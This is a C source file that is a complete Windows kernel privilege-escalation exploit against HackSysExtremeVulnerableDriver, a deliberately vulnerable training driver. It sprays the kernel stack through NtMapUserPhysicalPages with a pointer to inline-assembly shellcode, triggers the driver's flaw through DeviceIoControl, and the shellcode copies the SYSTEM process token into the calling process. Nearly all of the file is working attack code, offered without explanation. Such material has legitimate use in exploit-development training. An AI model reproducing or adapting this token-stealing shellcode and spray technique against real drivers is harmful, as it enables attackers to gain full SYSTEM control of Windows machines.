#include <stdio.h>
#include <Windows.h>

#define KTHREAD_OFFSET		0X124
#define KPROCESS_OFFSET		0x050
#define FLINK_OFFSET		0x0b8
#define PID_OFFSET			0x0b4
#define TOKEN_OFFSET		0x0f8
#define SYSTEM_PID			0x004
#define BUFFER_SIZE			1024
#define IO_CODE				0x22202F

typedef BOOL (*pNtMapUserPhysicalPages)(
	PVOID      VirtualAddress,
	ULONG_PTR  NumberOfPages,
	PULONG_PTR PageArray
);

HANDLE hDevice = NULL;
HMODULE hNtdll = NULL;
pNtMapUserPhysicalPages NtMapUserPhysicalPages = NULL;
DWORD buffer[BUFFER_SIZE] = { 0 };

void StealTokenShellcode()
{
	__asm
	{
		pushad

		mov eax, fs: [KTHREAD_OFFSET]
		mov eax, [eax + KPROCESS_OFFSET]
		mov ecx, eax

		find_system_pid :
			mov ecx, [ecx + FLINK_OFFSET]
			sub ecx, FLINK_OFFSET
			mov edx, [ecx + PID_OFFSET]
			cmp edx, SYSTEM_PID
			jnz find_system_pid

		mov edx, [ecx + TOKEN_OFFSET]
		mov[eax + TOKEN_OFFSET], edx

		popad
		int 0x3
		add esp, 0xc
		pop ebp
		ret 8
	}
}

void CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

void StackSpray()
{
	printf("[+] Start To Make Stack Spray\n");
	hNtdll = LoadLibraryA("Ntdll.dll");
	if (!hNtdll)
	{
		printf("[-] Failed To Load Ntdll.dll\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}
	NtMapUserPhysicalPages = (pNtMapUserPhysicalPages)GetProcAddress(hNtdll, "NtMapUserPhysicalPages");
	if (!NtMapUserPhysicalPages)
	{
		printf("[-] Failed To Get NtMapUserPhysicalPages Address\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] NtMapUserPhysicalPages Address: 0x%x\n", (DWORD)NtMapUserPhysicalPages);

	BOOL status = FALSE;
	for (DWORD i = 0; i < BUFFER_SIZE; ++i)
	{
		buffer[i] = (DWORD)StealTokenShellcode;
	}
	status = NtMapUserPhysicalPages(NULL, 1024, buffer);
	if (!status)
	{
		printf("[-] Failed To Make Stack Spray\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] Success To Make Stack Spray\n");

	DWORD length = 0;
	DWORD buf = 0x0;
	status = FALSE;
	status = DeviceIoControl(hDevice, IO_CODE, &buf, sizeof(buf), NULL, 0, &length, NULL);
	if (!status)
	{
		printf("[-] Failed To Send Message\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}
}

int main()
{
	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		NULL);
	if (!hDevice || hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed To Open Driver\n");
		printf("[-] Error Code: %d\n", GetLastError());
		exit(1);
	}
	printf("[+] Driver Handle: %d\n", (DWORD)hDevice);

	StackSpray();

	//printf("[+] Time To Get Shell\n");
	CloseHandle(hDevice);
	return 0;
}